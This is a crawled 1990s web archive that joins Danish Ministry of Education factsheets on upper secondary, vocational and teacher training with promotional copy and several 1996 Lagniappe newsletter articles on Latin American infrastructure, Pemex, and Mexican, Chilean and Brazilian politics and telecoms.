40) technical colleges. Structure Around 2/3 of the teaching time is spent on obligatory subjects and 1/3 on optional subjects. The optional subjects are either extensions of existing subjects, choice of technical area or entirely new subjects. All subjects are placed in a joint upper secondary system of levels with the levels A, B and C, where A is the highest level. The course comprises a minimum of three subjects at level A. The introductory part of the course is of 6 months� duration and comprises the subjects: vocational subjects, science (physics, chemistry, biology), mathematics, Danish, English and German/French. The individual colleges may offer different vocational subjects with different vocational content. The vocational subjects will have the same aim as a corresponding subject in a technical vocational education and training course. After the introductory part, the student can change to a technical vocational education and training course. The following 1 1/2 years comprise the subjects: technology, mathematics, physics, chemistry, biology, Danish, English, German/French, social studies and optional subjects. Danish is studied for the obligatory A-level, whereas the student is free to choose the level in the other subjects. A number of subjects at low or intermediate level C or B are completed as obligatory subjects after the 2nd year of the course. In the last year, Danish is obligatory, and the student must choose one of the technical subjects. In addition, at least one subject must be chosen at the highest level. At the end of the course, the student must carry out a major technical project complete with a report. The other optional subjects among other things include design, history of technology, quality control and business economics. Management Each college has a principal, who is accountable to the board of governors of the college and to the Ministry of Education. Otherwise, colleges are run on a non-hierarchical basis with only a few assistants to the principal and no other middle management. Teachers� councils are statutory, and teachers as well as students take active part in the decision-making at most levels. Board of Governors Each business and technical college has a board of governors which is responsible for the running of the college. The board consists of representatives of the local business sector (both employers and employees), the county council and the municipal councils. The teachers, the administrative staff of the college and the students are also represented on the board - but in a non-voting capacity. The board appoints and dismisses the principal and - on the recommendation of the principal - approves the appointment and dismissal of the other staff of the college. Student Participation Students� councils are statutory, and decisions regarding the form and content of the teaching are taken jointly by teachers and students. Cost of Teaching and Tuition The teaching costs are covered by the State, and tuition is free for the students. The School Year The duration of the school year is 35-36 weeks, excluding the examination period. National Supervision of Examinations All material presented for the examination must be approved by the Ministry of Education. The ministry draws up the written examination papers and appoints the external examiners for the oral and written examinations. Each year, the ministry decides on the subjects which the students are to be examined in. Examinations In order to pass the HHX or the HTX, the student must have a combination of common core and optional subjects corresponding to the total number of lessons. At least two of them must be taken at level A. The rest may be taken either at basic level or at intermediate level. The student must pass an examination in all subjects studied. This examination can either be in the form of a written, an oral, or a project examination, or it can be combination of the three. Examination Average Marks are awarded on a scale from 0 to 13. The final result includes the marks obtained in the examination as well as the marks awarded by the teacher on completion of the course. In order to pass, the student must obtain a minimum average of 6.0 both in the year�s work and at the examination. The student�s work is subject to continuous assessment, and term marks are given twice a year. The student�s examination average is important for his or her future possibilities in the education system, as admission is restricted at most higher education institutions. Student Counselling All upper secondary institutions have a number of counsellors. They are appointed locally from among the teachers of the institution and have received special training to function as counsellors. About 1/3 of their working time is devoted to counselling: career guidance as well as general pastoral advice. Grants and Loans Students are eligible for financial assistance in the form of a State education grant and/or loan. The kind and extent of the assistance are based on the applicant�s age and his or her own or - in some cases the parents� - financial circumstances. In order to obtain a grant and/or loan, the applicant must be a Danish citizen. Under certain circumstances, however, students from other countries may receive assistance according to the rules applying to Danish citizens.

In Denmark, there are about 55 technical colleges and 55 business colleges. The school part of the vocational education and training courses takes place at these colleges and to a limited extent at the labour market training centres. There are moreover a number of small vocational schools offering social and health training programmes, agricultural courses etc. A typical technical vocational education and training course begins with the so-called 2nd school period, which is of 20 weeks� duration. After the 2nd school period, there are 3-6 school periods alternating with practical training in a business enterprise. The commercial vocational education and training courses have a longer 2nd school period, whereas the subsequent school periods are shorter. There are approx. 85 vocational education and training courses, but as many of these courses have more than one specialisation, there are in fact a wide range of choices in the vocational education and training system. This structure guarantees multiskills with a high degree of flexibility and ability to adjust to labour market needs later on, for instance by adding new specialisations. The structure of the technical education and training courses differs from that of the commercial education and training courses. By far the longest period of technical education and training lies after the 2nd school period. This part of the course lasts between 2 and 4 years. It consists of 5-10 weeks of school-based training at a time alternating with on-the-job training periods of 6 months� duration. The principle behind the structure of the courses is that the students are given the same basic instruction at the beginning of the course. Subsequently, the degree of specialisation increases, the further they get in the course. Admission to Vocational Education and training There are normally no restrictions on admission to the vocational education and training courses. All applicants may commence on a vocational education and training course, but it is possible to restrict admission to the specialisations in those cases where the number of applicants is too great in comparison with the employment prospects. The screening will then take place at the intake to the 2nd school period. There are several ways for students to enter a vocational education and training course. They may either start directly with the 2nd school period or with an introduction course of 5-40 weeks� duration, the so-called 1st school period. It is also possible to start in a business enterprise with a short period of practical training followed by the 2nd school period. After the second school period, the students must go through a practical training period, which means that they have to enter into a training agreement with a business enterprise. The 1st School Period It is the overall aim of the first school period to make the students more confident in their choice of education, and they must therefore become familiarised with several different vocational areas during this course. The 1st school period is voluntary. The length and the contents are flexible, which means that it may last from 5 to 40 weeks depending on the background and wishes of the students. In the technical vocational education and training area, the average duration of the 1st school period is 20 weeks. The teaching focuses on practical tasks and workshop activities. Parallel with the teaching, the students are given a thorough orientation of the individual courses. They are informed of what is required from graduates in the individual trades and of the possibilities of further education and training within the area in question. Another advantage of the 1st school period - next to the orientation element - is that the students may start on a course, although they have not managed to get a training agreement with a business enterprise. Anyone desiring to embark on a vocational education and training course may to do so by starting with the first school period. In the technical education and training area, there are many students over 18 years of age who are skipping the 1st school period, because they have acquired the necessary knowledge in other ways and therefore do not need the introductory school period. Practical Training When a student wishes to commence a course with a practical training period in a business enterprise, he must have a training agreement with the business enterprise in question. The training agreement must cover the entire course and not just the introductory practical training period. The business enterprise commits itself contractually to train the student, and only when the contract is a reality, is it possible for the student to commence on the training course after the 2nd school period. Labour Market Co-operation The contents and structure of vocational education and training are designed and developed in a close co-operation between the Ministry of Education and the social partners. This guarantees a dynamic development and tailoring of vocational education and training in step with the rapidly changing qualification needs of trade and industry. The co-operation is undertaken at three levels through a number of advisory bodies, on which the employers� and employees� organisations are equally represented. It is the task of the trade committees responsible for the individual courses to approve business enterprises as practical training places. The committees consist of an equal number of representatives from the employers� and employees� organisations. In addition to being the approving bodies, the trade committees also act as advisers to business enterprises wishing to take on students for practical training. A committee may for instance find that a student employed in a highly specialised business enterprise must follow supplementary workshop training in order to obtain a broader scope in the training. In-Company Training It is the students� own responsibility to find a practical training place and enter into a training agreement with a business enterprise. The counselling and guidance services of the colleges do however assist the students with this. The student may carry through the whole of his practical training in one business enterprise. This has so far been the most common model in the Danish vocational education and training system. Or several companies may share one student/trainee. In that case, a combination agreement must be made from which it clearly appears which practical training periods and school periods the individual business enterprise is responsible for. This extends the possibilities of approving in particular very specialised businesses as practical training places. Young people who are unable to get a training agreement with a business enterprise get their practical training at the college. Thanks to the positive trend in the number of practical training places in trade and industry, this school-based practical training is only used by few students. Assessment The work and performance of the students is subject to continuous assessment. The assessment may have the form of an examination or the teacher may give an assessment of the student�s performance in class. In both cases, the student is awarded a mark according to the 13-point marking scale or in some cases according to another approved marking scale. Most vocational education and training courses are completed with an examination. Dependent on the course followed, it may be in the form of a journeyman�s test, an examination or a combination of the two. The scope and contents of the examination are drawn up by the college in co-operation with the trade committees. Optional Subjects It is the aim of the vocational education and training courses to give the students both vocational skills and general knowledge. The courses are meant to strengthen the personal development of the students and give them an understanding of the structure and development of society. Therefore, each college is committed to offer a broad range of optional subjects. It must be possible for the students to choose subjects for reasons of personal interest such as photography, but it should also be possible for them to choose subjects which prepare for an examination, i.e. subjects forming part of the leaving examinations of the Folkeskole or the upper secondary HF-examination. The optional subjects must correspond to a sixth of the total teaching time. Administration The vocational education and training courses are administered by two sets of rules, of which one lays down the targets and framework applying to all vocational schools and all courses. These rules are defined in the Act on Vocational Education and Training, the Act on Vocational Schools and about a dozen ministerial orders which deal with the individual parts of the vocational education and training courses. The other set of rules deals with the principles of the individual courses. These rules are laid down in education orders. As a consequence of the administrative regulation of the courses, there is a free choice of college for the students and their masters. In other words, the students do not only choose the course and thereby their future job. They also have the possibility of choosing the type of teaching which suits them best. Finance The vocational colleges receive grants from the state according to the so-called taximeter system, which means that grants are allocated on the basis of the number of students enrolled. This system implies that colleges with a great number of students enrolled will receive a big grant, whereas colleges with a dwindling number of students will receive a reduced grant. In principle, the teaching is free of charge for the students. The student receives a salary during the practical training period, and a student who commences the course with a practical training period, will receive a salary during the entire course. But students commencing the course with a school period must find other ways to cope during the first school periods. Students over 18 years of age may apply for a grant and loan from the State Education Grant and Loan Scheme. The student will receive a salary from the moment he or she commences the practical training period. Some colleges have special boarding facilities. They can be used by students who have more than 1 hour and 15 minutes� transport from their home to the college. If there are not enough available places at these facilities, priority will be given to those students who have been admitted to courses and specialisations which do not exist in their own local area. Students pay a fixed amount for their stay at the boarding facilities. Students under 18 years of age and students with a family to support may be exempted from payment, if it is not possible for them to follow a course in their local area. Related Courses An innovation in the Danish vocational education and training system is the system of basic social and health training programmes. The former courses for home care assistants, practical nurses, practical mental nurses, occupational counsellors and nursing home assistants have been merged into one course consisting of a basic course for health service helps and an advanced course which qualifies for positions as health service assistants. As examples of other courses offered under the auspices of the Ministry�s Department of Vocational Education and Training can be mentioned: the higher commercial examination course and the higher technical examination course which both qualify for employment as well as for admission to higher education. There are furthermore a wide range of advanced courses or diploma courses in technology, commerce and agriculture which constitute an offer for those students who wish to continue their studies on completion of the basic vocational education and training courses.

RETURN TO DANISH MINISTRY OF EDUCATION HOMEPAGE.WT02-B11-61IA080-000557-B046-17http://www.uvm.dk:80/dik/fact1.htm 130.225.250.45 19970213093937 text/html 7790HTTP/1.0 200 OKDate: Thu, 13 Feb 1997 09:39:37 GMTServer: Apache/0.8.13Content-type: text/htmlContent-length: 7618Last-modified: Mon, 14 Oct 1996 08:15:09 GMT Factsheet: The Training of Teachers for the Danish Folkeskole The Training of Teachers for the Danish Folkeskole (Municipal Primary and Lower Secondary School) At present, teacher training is offered at 18 colleges distributed all over Denmark. The colleges are administered by the Ministry of Education and are under ministry supervision both with regard to financing and to the education offered. The colleges of education are the only institutions which are authorized to provide the 4-year course, which qualifies for teaching posts in the Danish Folkeskole. Duration and Structure of the Course The teacher training course is of 4 years� duration and consists of 2 parts, each of 2 years� duration. The course includes teaching practice at a school for a total of 20 weeks, the organisation of which is decided by the individual institution. Part I of the course includes the following subjects: Danish, handwriting, rhetorics (about 32%) , religious education, history/social studies, arithmetic, natural science (about 18%), theory of education, psychology (about 20%) and 2 of the following 3 subjects: Music, physical education, visual art/design (about 20%) as well as teaching practice (about 10%). Part II of the course includes the following subjects: two main subjects chosen freely from among all the subjects of the Folkeskole (about 60%), general didactics and an educational specialization (about 25%) as well as teaching practice (about 15%). (The percentages indicate the proportion of a student�s fulltime workload devoted to these subjects during each of the two parts of the course). Admission and Student Population The admission requirement for the teacher training course is one of the following leaving examinations at upper secondary level: the upper secondary school leaving examination (the �Studentereksamen�), the higher preparatory examination (the �HFeksamen�), the higher commercial examination (the �HHX�) or the higher technical examination (the �HTX�). Due to the fact that there are normally more applicants than available study places, it has been necessary to introduce restricted admission to the teachertraining courses. 25% of the study places are awarded on the basis of the leaving examination at upper secondary level. As for the other 75%, it is in principle up to the colleges themselves to decide, but the colleges have agreed on common rules which are administered locally: the result of the leaving examination (�the higher, the better�), practical work experience, folk high school attendance, stay abroad, experience with children (youth centre, boyscout movement etc.). 1/3 of the students are men, 2/3 are women. About 55% of the students complete the course at the end of the officially stipulated time of study, and 75% in total complete the course. Legislation Act no 410 of 6 June 1991 on the Training of Teachers for the Danish Folkeskole only indicates the general lines of the course: the duration, subjects, rules regarding the institutions and their management etc. Ministerial order no 261 of 15 April 1992 regulates the scope of the subjects, the principal lines of the content of the subjects, and general rules for the assesment of students. The more detailed regulations are laid down in local curricula drawn up by the institutions. Administration Each school has a board consisting of 515 members representing local interests (the municipality, trade unions, folk high schools, municipal primary and lower secondary schools etc.). The board shall safeguard �the interests of the college as an educational institution and decide on the guidelines for the external work of the college and the development in the long term�. The board is furthermore responsible for the running of the college, including the administration of the budget. The rector is responsible for the daytoday running of the college, i.e. the teaching and finances of the college. Teachers� and students� councils may be established. Qualifications of the Teachers at the Colleges of Education The teachers at the colleges of education may have 3 different kinds of qualifications: 1. A university degree (Master�s level) in humanities or in natural sciences subjects, 2. An academic degree (Master�s level) from the Royal Danish School of Educational Studies, 3. A Folkeskole teacher qualification supplemented with inservice training (mostly in nonacademic subjects such as textile design, handwriting etc.). Economy The budget is based on the number of active students, i.e. students who pass the prescribed examinations within the officially stipulated time of study. Expenses relating to the teaching, materials, teaching practice and administration are based on this. Expenses relating to buildings, cleaning, energy/heating and rent are based on individual circumstances. About 80% of the budget go to the payment of salaries. And the remaining 20% cover the operational expenditure. The total cost of one student was DKK 50,000 per year in 1995. The Competence of Danish Folkeskole Teachers A Danish teacher�s certificate obtained at a college of education is based on a leaving examination at upper secondary level, and the course is of 4 years� duration. The colleges of education are the only institutions which are authorized to provide the 4year course, which qualifies for teaching posts in the Danish Folkeskole . Danish colleges of education offer a course which in scope and level can be said to correspond to certain types of university courses in the Englishspeaking world. The qualification which students obtain on completion of the course can most aptly be compared to a UK/US Bachelor�s degree. All the colleges are under ministry supervision. The quality of the examinations is controlled by external examiners appointed by the ministry. In theory, a teacher�s certificate qualifies the graduate teacher to teach all subjects to all forms (1st 10th forms), but in fact the teacher is generally considered competent to teach the 1st to 10th forms in the main subjects taken, the 1st to 7th forms in Danish, arithmetic and religious education and the lower forms in the core subjects taken. In practice, the authorities responsible for the appointment of teachers (i.e. the municipalities, including the school board and the headteacher of the individual school) take the final decision with regard to the question of competence.

Every month Brazil Project Advisor brings you theinformation you need to decide how to allocate your time and resources tosucceed in four major areas now set for long-term expansion: Telecommunications Energy (Oil & Gas, Power Roads, Railroads, Ports and Airports Water Systems and Waste Treatment Brazil Project Advisor provides continuous coverage of newdevelopments in these areas – and it does so early in the developmentcycle, when there is still time for you to get involved. Our network ofon-the-scene correspondents and close contacts with key players in the publicand private sectors gives you the information and insight you need to profitfrom this expanding economy. Communications - $75 billion over 8 years. Plans call for raising the number of installed phone lines from 14.3million to 40 million by 2003; boosting cellular lines from 1.9 million to 17.2million; expanding cable television coverage from the present 700,000subscribers to 16.5 million. To attract the investment needed to complete theseplans, the government is opening the telecommunications industry to privateparticipation. Transportation - $30 billion over 10 years Brazil's network of roads, bridges, railroads, airports and ports areall due for major overhaul and expansion. Right now the government is in theprocess of privatizing the railroad network, which will result in hundred ofmiles of track being recovered over the next decade. Road-building concessionsare slowly being awarded, and the offerings are expected to accelerate in thecoming months and years as federal and state governments and companies gainexperience in private management of road systems. Airports are in dire need of modernization. Demand for new communicationssystems, radar and other equipment is expected to soar over the next 10 years. The ports modernization program is in full swing. One project alone, whichwill link the state of Minas Gerais to the Vitoria ports complex, is expected tocost more than $2 billion. Energy - $23 billion over four years Government projections say Brazil will have to build more than 15,000MW of new generating capacity over the next 4 years at a cost of $23 billion.Such magnitudes of investment will be attracted through the privatization of thefederal and state systems. This process has already started. Over the next fewyears a building boom is expected as private interests take over government-owedhydroelectric plants that are stalled and build new ones under independentpower production schemes. Natural gas will be added to the Brazilian energy mix via pipelineconnections with Bolivia and Argentina. Brazil and Bolivia continue to work onthe details of the proposed $2 billion 2,377 km natural gas pipeline that wouldlink reserves in Bolivia with markets in southern Brazil. A completed pipelinewould spawn a series of power plants along the pipeline route. Water Systems and Environmental Services - $40 billion over 10 years This sector is ready to absorb large quantities of new investment.Only 30% of the population are estimated to have access to both clean watersupplies and adequate sewage and sanitation services. A recent study found thatonly 10% of the nation's sewage receives any treatment at all. With increasingfrequency municipalities as well as state and federal governments are turning tothe private sector to manage expansions of water and sewage systems. Exclusive project intelligence at a great value Gathering information on this array of project activity is time consumingand expensive. Our team of professionals can bring you the inside track onthese projects – systematically and reliably, throughout the year. Gettingthe same information yourself on Brazil's complex project developmentenvironment would cost thousands of dollars, take hundreds of hours of your timeand require a team of people. With Brazil Project Advisor youget focused information about what is happening, who is involved and where yourbest opportunities are, all for less than the price of a single plane ticket toBrazil.

This is the only source that accomplishes both, andit is very thoughtfully edited for business users. Robert B. Albertson, Vice President, Goldman, Sachs & Co., New York, New York "What I like most about Lagniappe is its crisp format,up to date relevant information and its sense of what is important."

VOL. 13, NO. 25 ISSN 1040-3175 Environmental Projects Report Blooming Market for Environmental Projects: Oasis or Mirage? Latin America's backlog of pollution problems and strong pressures to builda green future are placing environmental projects alongside telecommunicationsand power on national agendas. The growing list of potential projects rangesfrom cleaning polluted waterways and contaminated mines to installing massivesanitation systems and writing environmental legislation. With the World Bankforecasting market growth of 12% annually – $12 billion a year for waterand sewerage alone – the many US environmental firms see a rare chance toglobalize. But many obstacles stand in their way. A growing market, for example, does not mean an easy market. Environmentallaw and implementation vary widely, meaning firms have to acquaint themselveswith the letter of local law as well as the spirit. Furthermore, some marketsare dominated by competitive foreign firms, especially European water companies.Of equal importance, US firms often misjudge the challenge of financing emergingmarkets infrastructure, says Don Deieso, president and CEO of Metcalf &Eddy, one of the country's oldest environmental firms. "Many folks in ourindustry rush to these opportunities without asking the fundamental question:Are they financeable?" Clean Up Pressures. Firms willing to deal with the complexities areassured of a market growing in response to a variety of pressures. The issue ofclean water, air and land has come to a head for Latin American governments,driven by national "green" movements, commitments for sustainabledevelopment under various conventions, including the December 1994 Summit of theAmericas, and environmental standards under free trade agreements, such asNAFTA. Moreover, before getting involved in projects, multilateral agencies andprivate institutions are screening them for environmental impact. At largecorporations, it is the policy to impose worldwide standards on internationaloperations, sometimes as a precaution against future changes in the law.Furthermore, companies that follow an environmental ethic are keen to seepenalties for polluters, in part because their practices confer a costadvantage. Finding Financing. Water projects, which are fast becoming a leadingarea in Latin America's environ mental market, share a challenge common to otherinfrastructure in Latin America: the need to raise long- term financing thatwill be repaid by fees collected. To attract private capital, risks have to bemitigated. User fees must reflect the true cost of service, and fee-settingrules must be transparent to ensure predictable income and insulation frompolitics. Working With Cities. Creditworthiness of the offtakers, oftenmunicipalities buying the service, is another potential risk. One solution isbeing pioneered in the city of Bogota. With Chase Manhattan Bank as advisor, thecity is structuring a BOT project with the winning bidder, the French watercompany Degrement, a subsidiary and partner of Lyonnais des Eaux, to allow othermunicipal revenues to be pledged in the event of nonpayment. In a similarsolution, the Mexican government is extending revolving lines of credit throughthe state-owned public works bank Banobras for sponsors to draw on if themunicipality defaults. Beware Of Shifting Rules. When doing business in Latin America, USenvironmental companies often find themselves at the beginning of the learningcurve. Financing is one challenge, but they also need to look out forenvironmental and commercial laws that are backed up by the local authorities.Industry spokesman Deieso cites two instances where companies were forced toaccept rate reductions despite having signed contracts that they thought gavethem ironclad protection. Ways To Find Help. Through new industry organizations such as theEnvironmental Export Council and the Environmental Technologies Trade AdvisoryCommittee, small US companies may find support in breaking into Latin America'shigh-growth markets. Deieso advises them to work through the large engineer ingand construction companies. "It is a very expensive market to do on yourown. You can go to bankruptcy in a New York minute." He also recommendslocal con struction and engineering firms for their high quality and asessential partners in any venture. Where's The Work? To identify opportunities, multiple leads have tobe followed. Entities including the US Agency for International Development(USAID) and ExIm Bank have started departments to help companies find, win andfund environmental jobs. Government projects – the bulk of opportunities –are made public through a bidding process, and the World Bank or theInter-American Development Bank will have a stake in any big project. Indeed, aglance at the accompanying chart reveals the huge and expensive projects theseinstitutions are lining up. Typically, these projects involve dozens of smallercontracts. Private sector projects are much tougher to identify and, expertssay, a local presence is essential. Market Momentum. Also active on behalf of firms is the CommerceDepartment's Office of Environmental Technologies Exports (OETE), which openedin 1994. It has listed 250 opportunities in Latin America, includ ing 96 inmunicipal water treatment, 49 in consulting and 34 in industrial wastewatertreatment. The most promising markets for such goods and services, according toKristine Bretl, the Latin American specialist at the OETE, are Brazil, Mexico,Argentina, Chile, Colombia, Peru and Venezuela. Based on World Bank estimates, says Bretl, Argentina must invest $13billion to meet water supply and wastewater treatment targets for the year 2000.Brazil must invest over $19 billion in environmental technol ogies overthe next 10 years. However, Brazil is a harder market to crack than isArgentina, where Lyonnais des Eaux projects in Buenos Aires and Santa Fe haveproduced a positive track record for private involvement. Bretl notes that "85%of Brazil's market is supplied by domestic firms," but says "significantopportunities exist, especially as more municipal privatizations occur." One new opportunity is in Sao Paulo state, whose sanitation company (SABESP)allows subcontracting. After the 1994 peso devaluation stalled developments in Mexico, thecountry's environmental technologies market reached $1.5 billion in 1995 andwill grow 8- 14% annually for the next three years. US companies can expecttheir share of this market to grow to as much as 85% by 1998. In Chile,water privatization opportunities are "just around the bend" pendinglegislation to privatize regional water companies, with estimated combinedassets of $44 million. Given the Chileans' general preference for US products,as well as the ease of doing business in that country, Bretl says the Chileanmarket presents one of the best opportunities for US environmental technologyexports.

VOL. 13, NO. 24 ISSN 1040-3175 Mexico Pemex Fire Gives Fuel To Statist Opponents Of Modernization A fire at a northern Mexico City gasoline distribution terminal, the site ofa major accident 12 years ago, has revived controversy over the national oilcompany, Pemex. It has turned into a rallying cry against the company's chief byopponents of his modernizing ambitions and support for petrochemicalprivatizations. As industrial accidents go, this was fairly mild. On November 11, a safetyvalve at the San Juan Ixhuatepec (popularly known as San Juanico) terminal beganto leak. Before a safety team could finish repairs, the gasoline caught fire. Ittook almost two days to extinguish the flames, which destroyed a main gasolinetank and a smaller one, and damaged a third tank. Pemex estimated damage at P40million or $5 million, almost nothing for a company that does more than $20billion a year in business. Three Pemex workers and a firefighter died. A 1984explosion in the same place, by contrast, left more than 500 people died. Media Saturation. The political consequences, how ever, wereimportant. Public reaction became a firestorm over safety procedures and theprivatization of petro chemical plants, a controversial plan that ruling-partydinosaurs recently sabotaged (LL 11/8/96). Public indig nation was especiallysevere because the fire took place in the media center of the country, and in anarea of the capital symbolically important because of the 1984 disaster. Atelevision network broadcast the fire live for hours, capturing 40% of thenational audience. To make matters worse, Pemex director general Adrian Lajous was out of thecountry, accompanying President Ernesto Zedillo on a trip around South America,when the accident took place. Thus, during the first hours after the accident,only lower-level officials appeared in public to face criticism. Sacrificial Lamb. Calls for the resignation of Lajous, a careerPemex administrator, started almost immediately. Opposition politicians arguedthat Pemex had suffered several major industrial accidents since Lajous tookover as director general in 1995. The most serious was a July 1996 explosionthat destroyed the Cactus gas processing facility in Chiapas and left six dead. The real issue appears to be not the San Juanico accident itself, butinstead Lajous' staunch public stand favoring privatization of the country'spetrochemical plants. Making matters worse politically, he has cut spending andstaff and tried to improve efficiency. As a result, he is at odds with powerfulleftist groups in both the ruling Revolutionary Institutional Party (PRI) andopposition Party of the Democratic Revolution (PRD). These groups argue that spending cuts are to blame for the accident. Pemexmanagement points out that maintenance spending has actually increased over thepast few years, and that both maintenance spending and dedicated staff remainwell within international standards. They released documents indicating thatPemex registers a smaller number of accidents than similarly-sized oil firms. Atop company official with the company has, however, conceded that theseaccidents do tend to be more serious, partly because workers do not followsafety procedures. Consultants Called In. Pemex has asked international consultants tostudy the San Juanico fire and previous accidents. In two meetings withlegislators November 19, Lajous said preliminary information suggests a faultyvalve caused the fire. He added that Pemex will create a special safetycommission to establish procedures to reduce future accidents. But criticism has not abated. A top PRI official told Lagniappe that Lajoushad to resign, if only to ease political pressure on the president. Lajousretorts that he would quit if he thought it would improve safety at Pemex.President Zedillo so far, has allowed Lajous to stay in the job. Maybe this isbecause he believes in the overall vision Lajous has to offer, or because Pemexprofits are the highest in history. Opposition Snubs PRI Electoral Reform Hoped-for multi-party consensus on a new electoral law failed tomaterialize, so President Zedillo had to settle for the watered-down reformcongress passed November 19. The ruling PRI was the only party to vote for theproject, making it harder for Zedillo to tout the reform as an achievement andopening next year's mid-term elections to opposition criticism of the newelectoral law. Though it falls short of earlier expectations, the legislation stillcontains some worthwhile reforms. Most significantly, electoral authorities areno longer designated by the government since electoral tribunals are now a partof the judicial branch instead of the executive. There are new rules for accessto the media and a clearer campaign financing system imposing spending caps andprohibiting private funds. Financing Controversy. Campaign finance rules were the main obstacleto consensus. The PRI asked for P2.2 billion (about $278 million) to be spent byall parties in the 1997 campaigns. The opposition demanded that the figure belowered to between P900 million and P1 billion ($114-$126 million). The PRIversion, which prevailed, distributes funds according to a formula allotting 30%of funds equally between parties, and another 70% based on previous electoralresults, meaning the PRI still gets the lion's share. In addition, penalties forviolating spending caps have been softened. © Copyright 1996 Latin American Information Services, Inc. All RightsReserved.

VOL. 13, NO. 23 ISSN 1040-3175 Chile Municipal Elections Set Stage for 1999 Presidential Race The Christian Democrat Party (PDC), the main force in the ruling center-leftConcertacion coalition and the country's biggest political party, fared badly inrecent nationwide municipal elections. The party's overall vote dropped by anarithmetically small but politically significant 3%. It also lost control of animportant number of councils. The results may cost former finance ministerAlejandro Foxley his job as PDC chairman and a chance at a 1999 presidentialrun. The PDC has borne the brunt of the political wear and tear of governingwhile the other two main coalition parties, the Socialist Party (PS) and theParty for Democracy (PPD), have acted as an opposition within the government. Assuch, they are often spared the cost of sometimes unpopular measures. But thelower PDC vote also reflects the widespread belief that the party's mayors havebeen involved in more than their fair share of corruption and inefficientmunicipal management. Time For A Change? By increasing their share of votes andrepresentation on local councils, the coalition parties strengthened their handin the approaching Concertacion debate over the 1999 presidential candidate. ThePS and the PPD see no reason to accept a PDC candidate for the third time afterthe successful campaigns of PDC presidents Aylwin and Frei. The left's candidateis public works minister Ricardo Lagos, who holds a commanding lead in opinionpolls. Rising Star From The Right. Meanwhile, the municipal election raisedthe profile of Joaquin Lavin, a prospective presidential candidate from theright. Lavin is the incumbent mayor of Las Condes, one of the most importantmunicipalities in Santiago. As a member of the right-wing Independent DemocraticUnion (UDI), Lavin was re-elected with 78% of the vote. His victory has put awrinkle in the presidential hopes of center-right candidate, Andres Allamand,chairman of Renovacion Nacional (RN). Reserve Rule Slapped On DL600 Capital Foreign capital entering Chile under the country's DL600 foreign investmentstatute may now be subject to a reserve requirement following a recent ruling bythe central bank. To avoid the requirement, investors will have to prove thatmoney coming into the country is for "productive" purposes, not forfinancial speculation. The measure has been criticized by business but thecentral bank says it is simply interpreting existing rules under the DL600foreign investment statute. In a parallel measure, the central bank lifted a similar requirement onfunds coming in under the alternative Chapter XIV regulations, providing thattheir use is productive. Financing for capital increases in existing firms willbe exempt only if the increase corresponds to an expansion of productivecapacity. 30% On Hold. The new reserve requirement, known as the "encaje,"means that 30% of incoming funds must be deposited with the central bank for oneyear without interest. The measure was first introduced in 1991 but DL600financing has until now been exempt. The central bank describes the new rulingas closing a loophole. Authorities claim too much speculative capital was comingin through DL600, but have provided no figures. Doubtful Efficacy. Critics of the measure complain that it is not avery efficient way to deter speculative capital and also makes nonsense ofChile's aspirations of becoming a financial center in Latin America. The reserverequirement is already the subject of a number of court cases. Unperturbed,central bank president Carlos Massad maintains that removing the requirementwould expose the economy to fluctuations via the exchange rate. When thefinancial system gains more breadth and depth, Massad says, the rule will nolonger be needed. NAFTA Sticking Point. The reserve requirement was a major stumblingblock in negotiations between Chile and Canada for a NAFTA-style tradeagreement. Canada has apparently conceded the point and the trade agreement isexpected to be completed shortly. SANTIAGO AIRPORT TO EXPAND With airline traffic booming, the government has announced a plan to triplethe capacity of the Santiago airport by the year 2000. The project will requirean investment of around $100 million with $20 million to upgrade cargofacilities and $80 million for expanded passenger handling and an increase inboarding gates from four to 14. The project will be open to the private sectorthrough the build-operate-transfer public works concessions pro gram. Contracts for the passenger terminal and the freight facility are expectedto be awarded next year. The ministry of public works will host an internationalseminar to publicize the project on November 20 in Santiago. One consortium has already been formed to place a bid. The group is made upof the Airport Group International, Bechtel of San Francisco, the Odebrechtconstruction company of Brazil, the local LanChile airline and a local bank. TheEnersis electricity group, which has a major real estate project close to theairport, is also reportedly interested in forming a consortium. © Copyright 1996 Latin American Information Services, Inc.

VOL. 13, NO. 22 ISSN 1040-3175 Telecom Report/Brazil Investors Lose Interest In Cellular Licenses, Eye Data Transmission International telecommunications companies are less enthusiastic thanexpected about the upcoming sale of licenses to provide B-band cellular servicesin Brazil, but they are very interested in other services, such as datatransmission. "Companies are re-evaluating their strategies because they don't see areturn on their investment for seven to 10 years, and they will have to investhalf a billion to a billion dollars or more. Their shareholders won't stand forthat," said Grier Raclin, an attorney who advises the Brazilian governmentand multinationals on telecom munications issues in Brazil. Speaking at a Brazilian telecommunications conference in Miami organized bythe New York-based World Research Group, Jose Luis Oliveira de Souza, directorof Stelar Telecom, said, "The government expects to raise $4 billion fromthe sale of cellular licenses. I don't know where that money is going to comefrom. The licenses aren't worth that much." Stelar Telecom, which plans tobid for a license, is a member of Brazil's huge Odebrecht group. Schedule Pending. The government is to announce its schedulefor the sale of B-band cellular licenses on October 28, when it is supposed tosend a proposal for major telecommunications legislation to congress.Subsidiaries of Telebras, the government holding company for thetelecommunications sector, already offer A-band cellular services throughoutmuch of Brazil. B-band operators will compete with them. Paulo Roberto Cordeiro, the congressman who will manage the bill's passagethrough the lower house, said the government plans to issue documents forbidding on the licenses in early November, and choose winners in first half1997. A-Band Expansion. Raclin, a managing partner in Washington of theGardner, Carton & Douglas law firm, said one reason for lack of interest inB-band licenses is that A-band operators are quickly expanding their networks.Their intent is to control as much of the market as possible before the privatesector is allowed in. For instance, according to Oliveira de Souza's data, Sao Paulotelecommunications company Telesp will increase the number of cellular lines inmetropolitan Sao Paulo from 410,000 to 940,000 in 1997. In the interior of SaoPaulo state, the number will rise from 585,000 to 1.1 million. In Rio deJaneiro/Espirito Santo, the increase will be from 169,000 to 579,000 cellularlines. Oliveira de Souza predicted that by the time B-band providers beginoperations, likely around mid 1998, the waiting list for cellular access willhave virtually disappeared, though there will still be demand for fixed lines. "Thereis no waiting list for cellular lines now in the North, the Northeast, the MidWest and a good part of the South," he said. Infrastructure Gaps. Raclin and Oliveira de Souza agreed a majorissue facing new B-band operators is that they will be unable to quickly developtheir networks because of the shortage in Brazil of equipment, services andexpertise. "The A-band operators have a two-year head start. They are goingto dominate the cellular phone business for six or seven years," Raclinsaid. Oliveira de Souza said, "The longer it takes for the government toaward the licenses, the less they are worth. By the time we get into the market,we will almost have to pay for a subscriber." Onerous Connection Fees. Another big headache is that B-bandoperators will have to pay a long-distance connection fee to Embratel, themonopoly, state-owned longdistance provider. And they will have to pay forequipment to make the connection. A-band operators don't pay the connection fee.More 